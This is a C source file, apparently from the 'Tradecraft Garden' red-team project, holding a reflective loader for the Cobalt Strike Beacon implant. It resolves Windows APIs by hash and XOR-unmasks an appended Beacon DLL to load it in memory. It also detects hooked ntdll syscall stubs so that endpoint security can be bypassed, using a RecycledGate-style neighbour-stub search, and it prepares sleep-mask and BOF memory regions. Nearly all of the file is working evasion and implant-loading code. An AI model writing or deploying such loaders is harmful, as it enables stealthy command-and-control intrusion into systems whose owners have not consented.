/*
 * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * This file is part of Tradecraft Garden
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, see <https://www.gnu.org/licenses/>.
 */

/* function prototypes */
void ReflectiveLoader();

/* this is the REAL entry point to this whole mess and it needs to go first! */
__attribute__((noinline, no_reorder)) void go() {
	ReflectiveLoader();
}

/*
 * loader.h is a refactored Reflective Loader and some macros/definitions we need.
 * it has several functions intended to be used across loaders.
 */
#include "loaderdefs.h"
#include "loader.h"

/*
 * implementations of findFunctionByHash and findModulebyHash by walking the
 * Export Address Table.
 */
#include "resolve_eat.h"

/* for syscall resolving */
#include "syscalls.h"

#ifdef _DEBUG
#include "debug.h"
#endif

/* build a table of functions we need/want */
#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
	WIN32_FUNC(LoadLibraryA);
	WIN32_FUNC(GetProcAddress);
	WIN32_FUNC(VirtualProtect);
	WIN32_FUNC(VirtualAlloc);
	WIN32_FUNC(VirtualFree);
} WIN32FUNCS;

/*
 * Need other hashes?
 * https://github.com/ihack4falafel/ROR13HashGenerator
 */
#define KERNEL32DLL_HASH     0x6A4ABC5B
#define NTDLL_HASH           0x3CFA685D
#define LOADLIBRARYA_HASH    0xEC0E4E8E
#define GETPROCADDRESS_HASH  0x7C0DFCAA
#define VIRTUALALLOC_HASH    0x91AFCA54
#define VIRTUALPROTECT_HASH  0x7946C61B
#define VIRTUALFREE_HASH     0x30633AC

void findNeededFunctions(WIN32FUNCS * funcs) {
	char * hModule = findModuleByHash(KERNEL32DLL_HASH);

	funcs->LoadLibraryA   = (__typeof__(LoadLibraryA)   *) findFunctionByHash(hModule, LOADLIBRARYA_HASH);
	funcs->GetProcAddress = (__typeof__(GetProcAddress) *) findFunctionByHash(hModule, GETPROCADDRESS_HASH);
 	funcs->VirtualAlloc   = (__typeof__(VirtualAlloc)   *) findFunctionByHash(hModule, VIRTUALALLOC_HASH);
	funcs->VirtualProtect = (__typeof__(VirtualProtect) *) findFunctionByHash(hModule, VIRTUALPROTECT_HASH);
	funcs->VirtualFree    = (__typeof__(VirtualFree)    *) findFunctionByHash(hModule, VIRTUALFREE_HASH);
}

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BEACON_DLL[0] __attribute__((section("beacon_dll")));
char __XOR_KEY[0] __attribute__((section("xor_key")));

char * getLoaderStart() {
	return (char *)&go;
}

char * findBeaconDLL() {
#ifdef _DEBUG
	return (char *)test_dll;
#else
	return (char *)&__BEACON_DLL;
#endif
}

char * findXorKey() {
#ifdef _DEBUG
	return (char *)xor_key;
#else
	return (char *)&__XOR_KEY;
#endif
}

/*
 * Our embedded resources are masked, so we need to unmask them.
 */
typedef struct {
	int   length;
	char  value[];
} _RESOURCE;

char * unmaskAndLoad(WIN32FUNCS * funcs) {
	char      * srcData = findBeaconDLL();
	char      * dst;
	
	_RESOURCE * key;
	_RESOURCE * src;

	/* parse our preplen + xor'd $KEY and our masked data too */
	key = (_RESOURCE *)findXorKey();
	src = (_RESOURCE *)srcData;

	/* allocate memory for our unmasked content */
	dst = funcs->VirtualAlloc(NULL, src->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* unmask it */
	for (int x = 0; x < src->length; x++) {
		dst[x] = src->value[x] ^ key->value[x % key->length];
	}

	return dst;
}

void getSyscallEntry(char * ntdll, DWORD hash, SYSCALL_API_ENTRY * entry) {
	/* bad port of https://github.com/thefLink/RecycledGate */
	PIMAGE_DOS_HEADER pDosHdr          = NULL;
	PIMAGE_NT_HEADERS pNtHdrs          = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDir = NULL;

	PVOID pStub       = NULL;
	PVOID pIndirect   = NULL;
	PVOID pDirect     = NULL;
	DWORD dwSyscallNr = 0;

	PDWORD pdwAddrOfFunctions  = NULL;
	PWORD pwAddrOfNameOrdinals = NULL;
	
	WORD wIdxStub  = 0;
	WORD wIdxfName = 0;
	BOOL bHooked   = FALSE;

	pDosHdr    = (PIMAGE_DOS_HEADER)ntdll;
	pNtHdrs    = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + pDosHdr->e_lfanew);
	pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdll + pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);

	pdwAddrOfFunctions   = (PDWORD)((PBYTE)ntdll + pExportDir->AddressOfFunctions);
	pwAddrOfNameOrdinals = (PWORD)((PBYTE)ntdll + pExportDir->AddressOfNameOrdinals);

	/* get the stub */
	pStub = findFunctionByHash(ntdll, hash);

	/* walk the stub */
	for (wIdxStub = 0; wIdxStub < SYS_STUB_SIZE; wIdxStub++) {

		if (*((PBYTE)pStub + wIdxStub) == 0xe9) { // This syscall stub is hooked
			bHooked = TRUE;
			break;
		}

		if (*((PBYTE)pStub + wIdxStub) == 0xc3) // Too far
			return;

		if (*((PBYTE)pStub + wIdxStub) == 0x4c &&
			*((PBYTE)pStub + wIdxStub + 1) == 0x8b &&
			*((PBYTE)pStub + wIdxStub + 2) == 0xd1 &&
			*((PBYTE)pStub + wIdxStub + 3) == 0xb8 &&
			*((PBYTE)pStub + wIdxStub + 6) == 0x00 &&
			*((PBYTE)pStub + wIdxStub + 7) == 0x00) {

				BYTE low  = *((PBYTE)pStub + 4 + wIdxStub);
				BYTE high = *((PBYTE)pStub + 5 + wIdxStub);

				dwSyscallNr = (high << 8) | low;

				break;
		}
	}

	if (bHooked) {
		/* check neighbours */
		for (wIdxfName = 1; wIdxfName <= pExportDir->NumberOfFunctions; wIdxfName++) {
			if ((PBYTE)pStub + wIdxfName * DOWN < ((PBYTE)ntdll + pdwAddrOfFunctions[pwAddrOfNameOrdinals[pExportDir->NumberOfFunctions - 1]])) {
				if (*((PBYTE)pStub + wIdxfName * DOWN) == 0x4c &&
					*((PBYTE)pStub + 1 + wIdxfName * DOWN) == 0x8b &&
					*((PBYTE)pStub + 2 + wIdxfName * DOWN) == 0xd1 &&
					*((PBYTE)pStub + 3 + wIdxfName * DOWN) == 0xb8 &&
					*((PBYTE)pStub + 6 + wIdxfName * DOWN) == 0x00 &&
					*((PBYTE)pStub + 7 + wIdxfName * DOWN) == 0x00) {

						BYTE high = *((PBYTE)pStub + 5 + wIdxfName * DOWN);
						BYTE low  = *((PBYTE)pStub + 4 + wIdxfName * DOWN);
						
						dwSyscallNr = (high << 8) | (low - wIdxfName);
						pStub       = (PVOID)((PBYTE)pStub + wIdxfName * DOWN);

						break;
				}
			}

			if ((PBYTE)pStub + wIdxfName * UP > ((PBYTE)ntdll + pdwAddrOfFunctions[pwAddrOfNameOrdinals[0]])) {

				if (*((PBYTE)pStub + wIdxfName * UP) == 0x4c &&
					*((PBYTE)pStub + 1 + wIdxfName * UP) == 0x8b &&
					*((PBYTE)pStub + 2 + wIdxfName * UP) == 0xd1 &&
					*((PBYTE)pStub + 3 + wIdxfName * UP) == 0xb8 &&
					*((PBYTE)pStub + 6 + wIdxfName * UP) == 0x00 &&
					*((PBYTE)pStub + 7 + wIdxfName * UP) == 0x00) {

						BYTE high = *((PBYTE)pStub + 5 + wIdxfName * UP);
						BYTE low  = *((PBYTE)pStub + 4 + wIdxfName * UP);
						
						dwSyscallNr = (high << 8) | (low + wIdxfName);
						pStub       = (PVOID)((PBYTE)pStub + wIdxfName * UP);

						break;
				}
			}
		}
	}

	if (pStub && dwSyscallNr) {
		/* direct call is the top of the stub */
		pDirect = pStub;

		/* search for syscall; ret instructions */
		for (wIdxStub = 0; wIdxStub < SYS_STUB_SIZE; wIdxStub++) {
			if (*((PBYTE)pStub + wIdxStub) == 0x0f &&
				*((PBYTE)pStub + wIdxStub + 1) == 0x05 &&
				*((PBYTE)pStub + wIdxStub + 2) == 0xc3) {
					pIndirect = (LPVOID)((PBYTE)pStub + wIdxStub);
					break;
			}
		}
	}

	/* set values */
	entry->sysnum  = dwSyscallNr;
	entry->jmpAddr = pIndirect;
	entry->fnAddr  = pDirect;
}

void getSyscalls(SYSCALL_API * syscalls) {
	char * ntdll = findModuleByHash(NTDLL_HASH);

	/* get all the supported Nt functions */
	getSyscallEntry(ntdll, 0xD33BCABD, &syscalls->ntAllocateVirtualMemory);
	getSyscallEntry(ntdll, 0x8C394D89, &syscalls->ntProtectVirtualMemory);
	getSyscallEntry(ntdll, 0xDB63B5AB, &syscalls->ntFreeVirtualMemory);
	getSyscallEntry(ntdll, 0xE935E393, &syscalls->ntGetContextThread);
	getSyscallEntry(ntdll, 0x6935E395, &syscalls->ntSetContextThread);
	getSyscallEntry(ntdll, 0xC54A46C8, &syscalls->ntResumeThread);
	getSyscallEntry(ntdll, 0x4D1DEB74, &syscalls->ntCreateThreadEx);
	getSyscallEntry(ntdll, 0xF0CA9CA0, &syscalls->ntOpenProcess);
	getSyscallEntry(ntdll, 0x59651E8C, &syscalls->ntOpenThread);
	getSyscallEntry(ntdll, 0xDCD44C5F, &syscalls->ntClose);
	getSyscallEntry(ntdll, 0x5BB29BCB, &syscalls->ntCreateSection);
	getSyscallEntry(ntdll, 0xD5159B94, &syscalls->ntMapViewOfSection);
	getSyscallEntry(ntdll, 0xF21037D0, &syscalls->ntUnmapViewOfSection);
	getSyscallEntry(ntdll, 0x4F138492, &syscalls->ntQueryVirtualMemory);
	getSyscallEntry(ntdll, 0xB55C7785, &syscalls->ntDuplicateObject);
	getSyscallEntry(ntdll, 0x3AEFA5AA, &syscalls->ntReadVirtualMemory);
	getSyscallEntry(ntdll, 0xC5108CC2, &syscalls->ntWriteVirtualMemory);
	getSyscallEntry(ntdll, 0x84FCD516, &syscalls->ntReadFile);
	getSyscallEntry(ntdll, 0x680E1933, &syscalls->ntWriteFile);
	getSyscallEntry(ntdll, 0x3888F9D, &syscalls->ntCreateFile);
	getSyscallEntry(ntdll, 0x52E9A746, &syscalls->ntQueueApcThread);
	getSyscallEntry(ntdll, 0xB9C75AD6, &syscalls->ntCreateProcess);
	getSyscallEntry(ntdll, 0x5992A97F, &syscalls->ntOpenProcessToken);
	getSyscallEntry(ntdll, 0xB163D6A2, &syscalls->ntTestAlert);
	getSyscallEntry(ntdll, 0x234A15E3, &syscalls->ntSuspendProcess);
	getSyscallEntry(ntdll, 0x32ADFBCA, &syscalls->ntResumeProcess);
	getSyscallEntry(ntdll, 0xE4E1CAD6, &syscalls->ntQuerySystemInformation);
	getSyscallEntry(ntdll, 0x6EF04C50, &syscalls->ntQueryDirectoryFile);
	getSyscallEntry(ntdll, 0x814EF02C, &syscalls->ntSetInformationProcess);
	getSyscallEntry(ntdll, 0xE3D6909C, &syscalls->ntSetInformationThread);
	getSyscallEntry(ntdll, 0xB10FD839, &syscalls->ntQueryInformationProcess);
	getSyscallEntry(ntdll, 0xD83695, &syscalls->ntQueryInformationThread);
	getSyscallEntry(ntdll, 0x92B5DD95, &syscalls->ntOpenSection);
	getSyscallEntry(ntdll, 0xECDFDBE5, &syscalls->ntAdjustPrivilegesToken);
	getSyscallEntry(ntdll, 0x8408DD38, &syscalls->ntDeviceIoControlFile);
	getSyscallEntry(ntdll, 0x2DAAD6F4, &syscalls->ntWaitForMultipleObjects);
}

void getRtlFunctions(RTL_API * rtls) {
	char * ntdll = findModuleByHash(NTDLL_HASH);

	rtls->rtlDosPathNameToNtPathNameUWithStatusAddr = findFunctionByHash(ntdll, 0x78D569C0);
	rtls->rtlFreeHeapAddr                           = findFunctionByHash(ntdll, 0xDA12B8);

	/* rtlGetProcessHeapAddr is set to the ProcessHeap address from the PEB */
	_PEB * pPEB = (_PEB *)__readgsqword( 0x60 );
	rtls->rtlGetProcessHeapAddr = (void *)pPEB->lpProcessHeap;
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void ReflectiveLoader() {
	char       * loaderStart;
	char       * rawBeaconDll;
	char       * loadedBeaconDll;
	char       * bofMemory;
	char       * sleepMaskMemory;
	
	WIN32FUNCS funcs;
	DLLDATA    beaconData;
	
	USER_DATA        bud;
	SYSCALL_API      syscalls;
	RTL_API          rtlFunctions;
	ALLOCATED_MEMORY memory;

	/* initialise bud */
	_memset(&bud, 0, sizeof(USER_DATA));
	_memset(&syscalls, 0, sizeof(SYSCALL_API));
	_memset(&rtlFunctions, 0, sizeof(RTL_API));
	_memset(&memory, 0, sizeof(ALLOCATED_MEMORY));
	
	bud.version         = COBALT_STRIKE_VERSION;
	bud.syscalls        = &syscalls;
	bud.rtls            = &rtlFunctions;
	bud.allocatedMemory = &memory;

	/* get start of this loader */
	loaderStart = getLoaderStart();

	/* resolve Win32 functions */
	findNeededFunctions(&funcs);

	/* find Beacon DLL appended to this loader */
	rawBeaconDll = unmaskAndLoad(&funcs);

	/* parse the Beacon DLL */
	ParseDLL(rawBeaconDll, &beaconData);

	/* allocate memory for Beacon */
	loadedBeaconDll = funcs.VirtualAlloc(NULL, SizeOfDLL(&beaconData), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* define cleanup information for VirtualAlloc */
	ALLOCATED_MEMORY_CLEANUP_INFORMATION vaCleanup;
	_memset(&vaCleanup, 0, sizeof(ALLOCATED_MEMORY_CLEANUP_INFORMATION));

	vaCleanup.AllocationMethod = METHOD_VIRTUALALLOC;
	vaCleanup.Cleanup          = TRUE;

	/* set the region info for Beacon */
	bud.allocatedMemory->AllocatedMemoryRegions[0].Purpose            = PURPOSE_BEACON_MEMORY;
	bud.allocatedMemory->AllocatedMemoryRegions[0].AllocationBase     = loadedBeaconDll;
	bud.allocatedMemory->AllocatedMemoryRegions[0].RegionSize         = beaconData.NtHeaders->OptionalHeader.SizeOfImage;
	bud.allocatedMemory->AllocatedMemoryRegions[0].Type               = MEM_PRIVATE;
	bud.allocatedMemory->AllocatedMemoryRegions[0].CleanupInformation = vaCleanup;

	/* load Beacon into memory */
	LoadDLL(&beaconData, rawBeaconDll, loadedBeaconDll);

	/* process its imports */
	ProcessImports((IMPORTFUNCS *)&funcs, &beaconData, loadedBeaconDll);

	/* fix memory permissions and track each section */
	FixSectionsAndTrackMemory((IMPORTFUNCS *)&funcs, &beaconData, loadedBeaconDll, &bud.allocatedMemory->AllocatedMemoryRegions[0]);

	/* allocate memory for BOF & sleepmask */
	bofMemory       = funcs.VirtualAlloc(NULL, BOF_MEMORY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	sleepMaskMemory = funcs.VirtualAlloc(NULL, SLEEPMASK_MEMORY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* set memory info */
	bud.allocatedMemory->AllocatedMemoryRegions[1].Purpose                     = PURPOSE_BOF_MEMORY;
	bud.allocatedMemory->AllocatedMemoryRegions[1].AllocationBase              = bofMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[1].RegionSize                  = BOF_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Type                        = MEM_PRIVATE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].CleanupInformation          = vaCleanup;

	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].Label           = LABEL_BUFFER; 
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].BaseAddress     = bofMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].VirtualSize     = BOF_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].MaskSection     = TRUE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].CurrentProtect  = PAGE_READWRITE;
	bud.allocatedMemory->AllocatedMemoryRegions[1].Sections[0].PreviousProtect = PAGE_READWRITE;

	bud.allocatedMemory->AllocatedMemoryRegions[2].Purpose                     = PURPOSE_SLEEPMASK_MEMORY;
	bud.allocatedMemory->AllocatedMemoryRegions[2].AllocationBase              = sleepMaskMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[2].RegionSize                  = SLEEPMASK_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Type                        = MEM_PRIVATE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].CleanupInformation          = vaCleanup;

	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].Label           = LABEL_BUFFER; 
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].BaseAddress     = sleepMaskMemory;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].VirtualSize     = SLEEPMASK_MEMORY_SIZE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].MaskSection     = FALSE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].CurrentProtect  = PAGE_READWRITE;
	bud.allocatedMemory->AllocatedMemoryRegions[2].Sections[0].PreviousProtect = PAGE_READWRITE;

	/* resolve syscall info */
	getSyscalls(&syscalls);
	getRtlFunctions(&rtlFunctions);

	/* get the entry point */
	DLLMAIN_FUNC entryPoint = EntryPoint(&beaconData, loadedBeaconDll);

	/* free the unmasked copy */
	funcs.VirtualFree(rawBeaconDll, 0, MEM_RELEASE);

	/* call it three times */

	/* DLL_BEACON_USER_DATA */
	entryPoint((HINSTANCE)0, DLL_BEACON_USER_DATA, &bud);

	/* DLL_PROCESS_ATTACH */
	entryPoint((HINSTANCE)loadedBeaconDll, DLL_PROCESS_ATTACH, NULL);

	/* DLL_BEACON_START */
	entryPoint((HINSTANCE)loaderStart, DLL_BEACON_START, NULL);
}